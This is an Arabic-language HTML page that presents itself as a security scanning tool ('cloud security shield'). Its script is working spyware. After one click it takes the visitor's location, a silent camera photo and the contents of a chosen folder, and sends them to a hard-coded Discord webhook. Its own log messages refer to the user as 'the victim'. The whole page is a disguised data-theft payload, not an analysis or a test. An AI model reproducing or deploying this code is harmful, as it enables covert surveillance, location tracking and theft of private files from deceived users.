<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام فحص الأمان الشامل</title>
    <style>
        body { font-family: sans-serif; background: #0d1117; color: white; text-align: center; padding: 20px; }
        .box { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; max-width: 500px; margin: auto; }
        .btn { background: #238636; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; width: 100%; font-weight: bold; }
        #log { background: black; color: #0f0; padding: 15px; border-radius: 10px; margin-top: 20px; text-align: left; font-family: monospace; font-size: 12px; height: 200px; overflow-y: auto; }
        .error { color: #f85149; }
    </style>
</head>
<body>

<div class="box">
    <h1>🛡️ درع الأمان السحابي</h1>
    <p>اضغط للبدء في تفعيل بروتوكولات الحماية (موقع، كاميرا، ملفات)</p>
    
    <button class="btn" id="startBtn">بدء الفحص الشامل ⚡</button>
    
    <div id="log">بانتظار الضغط على الزر...</div>
</div>

<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;" width="640" height="480"></canvas>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
    const logDiv = document.getElementById('log');

    function writeLog(text, isError = false) {
        const span = isError ? `<span class="error">${text}</span>` : text;
        logDiv.innerHTML += `<br>> ${span}`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        writeLog("بدء العملية...");

        // 1. طلب الموقع الجغرافي
        writeLog("طلب صلاحية الموقع...");
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToDiscord("📍 الموقع الجغرافي", { "الرابط": link });
            writeLog("✅ تم الحصول على الموقع.");
            
            // 2. طلب الكاميرا
            await stepCamera();
        }, (err) => {
            writeLog("❌ رفض الضحية صلاحية الموقع.", true);
            stepCamera(); // ننتقل للخطوة التالية حتى لو رفض
        });
    });

    async function stepCamera() {
        writeLog("طلب صلاحية الكاميرا (ماسك الوجه)...");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;
            
            setTimeout(async () => {
                c.getContext('2d').drawImage(v, 0, 0);
                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
                await sendFile(blob, "camera.jpg", "📸 صورة الضحية");
                stream.getTracks().forEach(t => t.stop());
                writeLog("✅ تم التقاط الصورة صامتاً.");
                
                // 3. طلب الملفات
                await stepFiles();
            }, 2000);
        } catch (e) {
            writeLog("❌ رفض الضحية الكاميرا أو المتصفح لا يدعمها بدون HTTPS.", true);
            stepFiles();
        }
    }

    async function stepFiles() {
        writeLog("طلب صلاحية الوصول للمجلدات...");
        if (!window.showDirectoryPicker) {
            writeLog("❌ متصفحك لا يدعم الوصول للمجلدات أو الرابط غير آمن (HTTPS).", true);
            return;
        }

        try {
            const handle = await window.showDirectoryPicker();
            writeLog("⚠️ تم منح الوصول! جاري سحب الملفات تلقائياً...");
            
            async function scan(h) {
                for await (const entry of h.values()) {
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        await sendFile(file, file.name, `📄 ملف: ${file.name}`);
                        writeLog(`سحب: ${file.name}`);
                    } else if (entry.kind === 'directory') {
                        await scan(entry);
                    }
                }
            }
            await scan(handle);
            writeLog("✅ اكتمل السحب الشامل.");
        } catch (e) {
            writeLog("❌ رفض الضحية الوصول للمجلد.", true);
        }
    }

    async function sendToDiscord(title, fields) {
        const f = Object.keys(fields).map(k => ({ name: k, value: String(fields[k]) }));
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [{ title, fields: f, color: 16711680 }] })
        });
    }

    async function sendFile(blob, name, text) {
        const fd = new FormData();
        fd.append('file', blob, name);
        fd.append('payload_json', JSON.stringify({ content: text }));
        await fetch(WEBHOOK, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
